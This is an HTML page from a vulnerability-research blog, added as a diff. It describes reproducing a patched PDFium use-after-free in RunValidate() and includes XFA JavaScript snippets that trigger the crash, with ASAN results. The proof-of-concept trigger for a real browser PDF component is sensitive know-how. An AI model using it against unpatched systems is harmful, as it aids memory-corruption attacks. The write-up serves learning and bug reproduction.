@@ -1,0 +1,208 @@
+<!doctypehtml>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Reproduction of PDFium Issue #933163</title>
+
+  <meta name="viewport"content="width=device-width,initial-scale=1">
+  <meta http-equiv="X-UA-Compatible"content="ie=edge">
+  <meta property="og:title"content="uhg's corner">
+  <meta property="og:image"content="https://i.ibb.co/4pRxk6j/trashthumbsup-c-websitethumb.png">
+  <meta property="og:description"content="vulnerability resarch, exploits and cve, ctf blog">
+  <meta property="og:url"content="https://ultimatehg.github.io">
+  <meta property="og:image:width"content="1200">
+  <meta property="og:image:height"content="627">
+  <meta property="og:type"content="website"> 
+
+  <link rel="shortcut icon"href="../assets/favicon.ico"type="image/x-icon">
+  <link rel="preload"href="../styles/article.css"as="style">
+  <link rel="stylesheet"href="../styles/article.css">
+</head>
+<body>
+  <header id="top-container"role="navigation">
+    <nav>
+  <a class="logo-link"href="/">
+    <h1>uhg's corner</h1>
+    <span>ctf_writeups | security_research | cs_stuff</span>
+  </a>
+  <small>
+    <a id="about"class="info-link"href="/about.html">👀About</a> /
+    <a id="works"class="info-link"href="/works.html">🔥Works</a> /
+    <a id="articles"class="info-link"href="/articles.html">📚Articles</a>
+  </small>
+</nav>
+
+  </header>
+  <main id="main-container">
+    <article id="article-container">
+      <h1 id="article-title">
+        Reproduction of PDFium Issue #933163
+      </h1>
+      
+        <h2 id="article-subtitle">
+          Use-after-Free vulnerability on CXFA_FFDocView::RunValidate()
+        </h2>
+      
+      <time id="article-date">
+        2020.10.14
+      </time>
+      <section id="article-content-container">
+        <details><summary>Table of Contents</summary>
+<p><div class="table-of-contents"><ul><li><a href="#introduction">Introduction</a><li><a href="#first-steps">First Steps</a><li><a href="#finding-the-vuln-function">Finding the Vuln Function</a><li><a href="#confirming-the-vulnerability">Confirming the Vulnerability</a><li><a href="#attempting-an-exploit">Attempting an Exploit</a><li><a href="#afterword">Afterword</a></ul></div><p></p>
+</details>
+<h1 id="introduction"tabindex="-1">Introduction</h1>
+<p>I have always wanted to learn exploitation of the Chromium V8 Engine and its components, and this desire actually originally stemmed from CTFs, since there were quite a few CTFs that had pwn questions related to Chromium V8 exploitation. When my supervisor from my internship told me that I could try reproducing a now-patched security vulnerability to learn PDFium, which is Chromium’s open-source PDF reader based heavily on Foxit Reader, obviously I jumped straight on the idea.</p>
+<p>This was the journey of discovering the source of the bug and making attempts to exploit it.</p>
+<p>Link to bug: <a href="https://bugs.chromium.org/p/chromium/issues/detail?id=933163">https://bugs.chromium.org/p/chromium/issues/detail?id=933163</a></p>
+<h1 id="first-steps"tabindex="-1">First Steps</h1>
+<p>Since the both of us were generally new C++ as well as PDF format and parsing, we had to crash course some elements of C++ as well as figure out how PDFs are handled by a PDF viewer, which made this an interesting ride.</p>
+<p>In this bug, there is a Use-after-Free vulnerability on the <code>RunValidate()</code>function of <code>CXFA_FFDocView</code> class. Let's take a look at the vulnerable (pre-patched) function.</p>
+<pre class="hljs"><code><span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">CXFA_FFDocView::RunValidate</span><span class="hljs-params">()</span> </span>{
+
+  <span class="hljs-keyword">if</span> (!m_pDoc-&gt;<span class="hljs-built_in">GetDocEnvironment</span>()-&gt;<span class="hljs-built_in">IsValidationsEnabled</span>(m_pDoc.<span class="hljs-built_in">Get</span>()))
+    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
+
+  <span class="hljs-keyword">for</span> (CXFA_Node* node : m_ValidateNodes) {
+    <span class="hljs-keyword">if</span> (!node-&gt;<span class="hljs-built_in">HasRemovedChildren</span>())
+      node-&gt;<span class="hljs-built_in">ProcessValidate</span>(<span class="hljs-keyword">this</span>, <span class="hljs-number">0</span>);
+  }
+
+  m_ValidateNodes.<span class="hljs-built_in">clear</span>();
+  <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;
+}
+</code></pre>
+<p>We can break down the function as follows:</p>
+<ol>
+<li>Firstly, <code>RunValidate()</code> will be called if validation is requested (this can be inferred by finding instances where <code>RunValidate()</code>is called.</li>
+<li>If validation is not enabled, <code>RunValidate()</code>returns false and does not run validation script.</li>
+<li>The for loop iterates through <code>m_ValidateNodes</code>(with an iterator), and if a node does not have removed children it would run <code>ProcessValidate()</code>on the nodes.</li>
+<li><code>m_ValidateNodes.clear()</code>is run to destroy all elements of <code>m_ValidateNodes</code> to prepare it again for more possible validation.</li>
+</ol>
+<p>So, we know that the bug is a UaF, which means that there has to be something in here that somehow frees memory while another object is still trying to access it. Because <code>IsValidationsEnabled()</code> shouldn't affect any read/write data, the problem has to lie within the for loop. The iterator seems to be the only possible source of the problem for a UaF vulnerability.</p>
+<p>If we take a look at the patch, we can see that the problem was fixed by calling the move constructor on <code>m_ValidateNodes</code> before iterating through it. Bingo, the problem does lie with the iterator. But just how does it work? This was where our lack of C++ knowledge initially gated us from reaching a definitive answer, but once we got to know how vectors were defined, it got a lot easier.</p>
+<p>In the simplest terms, vectors, if defined without a starting capacity, would start with capacity 0, then 1, 2, 4… and so on, doubling its capacity every time an object is pushed into it after it has already reached its capacity. When it expands its capacity, it will first copy all data to a temporary store, deallocate the space used by the old vector, malloc a new larger space (2n size) for the expanded vector, then copy all the data back from the temporary store into the expanded vector. Now that we knew vectors' data structure, we could jump back into seeing what exactly was causing the UaF.</p>
+<h1 id="finding-the-vuln-function"tabindex="-1">Finding the Vuln Function</h1>
+<p>First, without digging through the code, I just wanted to check if <code>ProcessValidate()</code> pushed into <code>m_ValidateNodes</code> potentially. I assumed it did, since:</p>
+<ol>
+<li>In the patched code there was a comment <code>// May have created more nodes to validate, try again</code> after the for loop, which signified that nodes could have been added to <code>m_ValidateNodes</code> during <code>ProcessValidate()</code>.</li>
+<li>There was nothing else in the for loop that could have potentially created more nodes to validate, since <code>HasRemovedChildren()</code> only returned a variable (0 or 1 in this case) and does not affect <code>m_ValidateNodes</code>.</li>
+<li><code>ProcessValidate()</code> takes in the arg <code>CXFA_FFDocView* docView</code>, which means it has access to the concerned <code>docView</code> context, meaning it would be able to potentially change member variables of the <code>docView</code>.</li>
+</ol>
+<p>We then theorized the scenario: if let's say the vector <code>m_ValidateNodes</code> hits its max backing store and <code>ProcessValidate()</code> adds a new node to <code>m_ValidateNodes</code>.</p>
+<p>Then C++ would have to, as mentioned above, do something like (pseudocode)</p>
+<pre class="hljs"><code>base = m_ValidateNodes.backingstore
+<span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; m_ValidateNodes.length; i++) {
+  currnode = base[i]
+  <span class="hljs-built_in">free</span>(base)
+  m_ValidateNodes.backingstore = <span class="hljs-built_in">malloc</span>(newsize)
+  m_ValidateNodes.length = newsize
+}
+</code></pre>
+<p>in order to increase its backing store. This is how a Vector achieves O(1) amortized time for push_back(). This also means that the memory allocated to <code>m_ValidateNodes</code> would have now potentially (and most likely) changed.</p>
+<p>Because <code>ProcessValidate()</code> is called <strong>within</strong> the for loop, which loops through addresses of the current <code>m_ValidateNodes</code>, if <code>m_ValidateNodes</code> were to have to increase its backing store size, it would mean that the actual pointers in <code>m_ValidateNodes</code> would have already changed, but the iterated pointer node in the for loop <code>for (CXFA_Node* node: m_ValidateNodes)</code> still pointed to the &quot;old&quot; location of <code>m_ValidateNodes</code>, which is now freed. Thus, the iterated node is viewed as a valid variable, but when <code>ProcessValidate()</code> is run, it would try to use the faulty pointer (which points to the now-freed space), causing a SIGSEGV.</p>
+<p>This leads to UaF and thus potential RCE.</p>
+<h1 id="confirming-the-vulnerability"tabindex="-1">Confirming the Vulnerability</h1>
+<p>We have just based the above theory on an assumption. Although the assumption is very well justified, as there is almost no other possible way for <code>m_ValidateNodes</code> to have been changed, we still need to confirm that <code>ProcessValidate()</code> does add nodes before we move forward. PDFium is part of Chromium, which runs on the Chromium V8 Engine, which always has wrappers upon wrappers, so we had to unravel the function.</p>
+<p><code>ProcessValidate()</code> is run on the <code>CXFA_Node</code> class, so a quick look at <code>CXFA_Node.h</code> reveals that there is indeed a prototype function for <code>ProcessValidate()</code> in there that accepts a param <code>CXFA_FFDocView* docView</code>, which is the object we want to look at. A quick look at <code>ProcessValidate()</code> reveals many functions that are being called, but to narrow down on the correct function we only looked for functions called on <code>docView</code>, and there were only 2 instances of this happening:</p>
+<pre class="hljs"><code><span class="hljs-type">bool</span> bStatus = docView-&gt;<span class="hljs-built_in">GetLayoutStatus</span>() &lt; XFA_DOCVIEW_LAYOUTSTATUS_End;
+</code></pre>
+<p>and</p>
+<pre class="hljs"><code><span class="hljs-keyword">if</span> (script) {
+  CXFA_EventParam eParam;
+  eParam.m_eType = XFA_EVENT_Validate;
+  eParam.m_pTarget = <span class="hljs-keyword">this</span>;
+  std::<span class="hljs-built_in">tie</span>(iRet, bRet) = <span class="hljs-built_in">ExecuteBoolScript</span>(docView, script, &amp;amp;eParam);
+}
+</code></pre>
+<p>We know <code>GetLayoutStatus()</code> could not have added or removed nodes as it only returns a flag to compare against <code>XFA_DOCVIEW_LAYOUTSTATUS_End</code>. So the answer should lie within <code>ExecuteBoolScript(docView, script, &amp;Param)</code>. We take a look at <code>ExecuteBoolScript()</code>, and we realized that what <code>ExecuteBoolScript()</code> does was to run any validation script attached to the node and return a Boolean on whether the node is valid or not valid.</p>
+<h1 id="attempting-an-exploit"tabindex="-1">Attempting an Exploit</h1>
+<p>This is where the fun part comes in, with just this knowledge, it was already sort of possible to build an exploit. Because we know that the vector <code>m_ValidateNodes</code> was not initialized with a starting capacity (from the header file), we can first assume the use of C++'s default vector capacity allocation: 0, 1, 2, 4, 8, 16…</p>
+<pre class="hljs"><code>&lt;event activity=<span class="hljs-string">&quot;docReady&quot;</span> ref=<span class="hljs-string">&quot;$host&quot;</span>&gt;
+  &lt;script contentType=<span class="hljs-string">&quot;application/x-javascript&quot;</span>&gt;
+    xfa.host.<span class="hljs-built_in">setFocus</span>(<span class="hljs-string">&quot;my_doc.combox_0.combox&quot;</span>);
+    var val=xfa.<span class="hljs-built_in">resolveNode</span>(<span class="hljs-string">&quot;my_doc.combox_0.combox&quot;</span>);
+    val.rawValue=<span class="hljs-string">&quot;1&quot;</span>;
+	xfa.host.<span class="hljs-built_in">setFocus</span>(<span class="hljs-string">&quot;my_doc.combox_1.combox&quot;</span>);
+	xfa.host.<span class="hljs-built_in">openList</span>(<span class="hljs-string">&quot;my_doc.combox_0.combox&quot;</span>);
+  &lt;/script&gt;
+&lt;/event&gt;
+</code></pre>
+<p>This puts 1 node into <code>m_ValidateNodes</code> at the start, and calling openList will call <code>RunValidate()</code>, with the following validate script on <code>combox_0</code>:</p>
+<pre class="hljs"><code>&lt;validate&gt;
+  &lt;script contentType=<span class="hljs-string">&quot;application/x-javascript&quot;</span>&gt;
+    xfa.host.<span class="hljs-built_in">setFocus</span>(<span class="hljs-string">&quot;my_doc.combox_1.combox&quot;</span>);
+	var val=xfa.<span class="hljs-built_in">resolveNode</span>(<span class="hljs-string">&quot;my_doc.combox_1.combox&quot;</span>);
+	val.rawValue=<span class="hljs-string">&quot;1&quot;</span>;
+	xfa.host.<span class="hljs-built_in">setFocus</span>(<span class="hljs-string">&quot;my_doc.combox_0.combox&quot;</span>);
+  &lt;/script&gt;
+&lt;/validate&gt;
+</code></pre>
+<p>What we want is to change a value and add it to <code>m_ValidateNodes</code> while validating a node so that <code>m_ValidateNodes</code> would have exceeded its current capacity and would thus need to increase its backing store mid-validation.</p>
+<p>However, running this did not produce any error:</p>
+<p><img src="https://i.ibb.co/F73xkTy/1.png"alt=""loading="lazy"decoding="async"></p>
+<p>Hmm, what could be the problem? Let's try increasing the amount of combo boxes by 1, since we assumed initially that the backing store would be 0, 1, 2, 4…, and it turned out that the backing store didn't need to increase from 1 to 2, if we have 2 objects initially in the vector and add a third, it would surely have to increase its capacity from 2 to 4 right?</p>
+<p>We add a third combo box, <code>combox_2</code> with the exact same format as <code>combox_1</code>, and instead also modify the value of <code>combox_1</code> on docReady event so that <code>m_ValidateNodes</code> would have 2 objects before <code>RunValidate()</code> is executed:</p>
+<pre class="hljs"><code>&lt;event activity=<span class="hljs-string">&quot;docReady&quot;</span> ref=<span class="hljs-string">&quot;$host&quot;</span>&gt;
+  &lt;script contentType=<span class="hljs-string">&quot;application/x-javascript&quot;</span>&gt;
+	xfa.host.<span class="hljs-built_in">setFocus</span>(<span class="hljs-string">&quot;my_doc.combox_0.combox&quot;</span>);
+	var val=xfa.<span class="hljs-built_in">resolveNode</span>(<span class="hljs-string">&quot;my_doc.combox_0.combox&quot;</span>);
+	val.rawValue=<span class="hljs-string">&quot;1&quot;</span>;
+	xfa.host.<span class="hljs-built_in">setFocus</span>(<span class="hljs-string">&quot;my_doc.combox_1.combox&quot;</span>);
+	var val1=xfa.<span class="hljs-built_in">resolveNode</span>(<span class="hljs-string">&quot;my_doc.combox_1.combox&quot;</span>);
+	val1.rawValue=<span class="hljs-string">&quot;1&quot;</span>;
+	xfa.host.<span class="hljs-built_in">setFocus</span>(<span class="hljs-string">&quot;my_doc.combox_2.combox&quot;</span>);
+	xfa.host.<span class="hljs-built_in">openList</span>(<span class="hljs-string">&quot;my_doc.combox_0.combox&quot;</span>);
+  &lt;/script&gt;
+&lt;/event&gt;
+</code></pre>
+<p>And we modify the validate script of <code>combox_0</code> so that it changes the value of <code>combox_2</code> instead of <code>combox_1</code> so that we add a third node to <code>m_ValidateNodes</code> which theoretically should have a backing store of 2.</p>
+<p>This time when we ran the pdf through pdfium, we got a SIGSEGV. This is one big step towards success, but we're not completely in the clear yet.</p>
+<p><img src="https://i.ibb.co/n08t3My/2.png"alt=""loading="lazy"decoding="async"></p>
+<p>We can see that the SIGSEGV occurs on the function <code>HasFlag()</code>, which is a good sign since this function is called inside <code>ProcessValidate()</code>, which is called within the exploitable for loop. We load the pdf using pdfium with ASAN enabled, and we get the following:</p>
+<p><img src="https://i.ibb.co/TkZhGTc/3.png"alt=""loading="lazy"decoding="async"></p>
+<p>Great, we have now reproduced the UaF vulnerability. As a double-check, we load the exploit pdf provided on the bug report in both in gdb and in CLI with asan enabled:</p>
+<p><img src="https://i.ibb.co/r0tCMRR/4.png"alt=""loading="lazy"decoding="async"></p>
+<p>The SIGSEGV occurred at the same place, with <code>HasFlag()</code> having the same arg <code>this=0x100010001</code>.</p>
+<p><img src="https://i.ibb.co/pz1LX0y/5.png"alt=""loading="lazy"decoding="async"></p>
+<p>The address that the UaF occurred on seemed to be different in both PDFs, but that shouldn't matter because different PDF layouts were used in both PDFs.</p>
+<p>This is a graph roughly explaining the logic flow when parsing the exploit pdf:</p>
+<p><img src="https://i.ibb.co/7k1b24h/6.png"alt=""loading="lazy"decoding="async"></p>
+<p>Thus, we have achieved UaF with the bug in issue #933163.</p>
+<h1 id="afterword"tabindex="-1">Afterword</h1>
+<p>We still don't completely understand the inner workings of pdfium because we did not go through the code base thoroughly, and we did do a bit of calculated guessing to be able to land the reproduction of the exploit. There are still a lot of functions where we didn't know exactly when would be called within the <code>CXFA_FFDocView</code> and <code>CXFA_Node</code> classes, but we believe we generally understand the cause for this exploit and how we can trigger it.</p>
+<p>Thanks for reading.</p>
+
+      </section>
+      <section id="article-navigation">
+        
+          <div class="article-navigation-item article-navigation-next">
+            <a href="/article/2.html">
+              <div class="article-navigation-arrow article-navigation-next">＜</div>
+              <div class="article-navigation-content article-navigation-next">
+                <p class="article-navigation-title">Learning To Harness: Crash Coursing C</p>
+                <p class="article-navigation-subtitle">Part 1: Understanding structs and pointers in a harness</p>
+              </div>
+            </a>
+          </div>
+        
+        
+          <div class="article-navigation-item article-navigation-prev">
+            <a href="/article/0.html">
+              <div class="article-navigation-arrow article-navigation-prev">＞</div>
+              <div class="article-navigation-content article-navigation-prev">
+                <p class="article-navigation-title">Writeup for RedPwnCTF 2020 coffer-overflow-0, 1, 2</p>
+                <p class="article-navigation-subtitle">Beginners Pwn</p>
+              </div>
+            </a>
+          </div>
+        
+      </section>
+      <section id="article-list-button-container">
+        <a href="/articles.html">
+          <div id="article-list-button">📚</div>
+        </a>
+      </section>
+    </article>
+  </main>
+
+
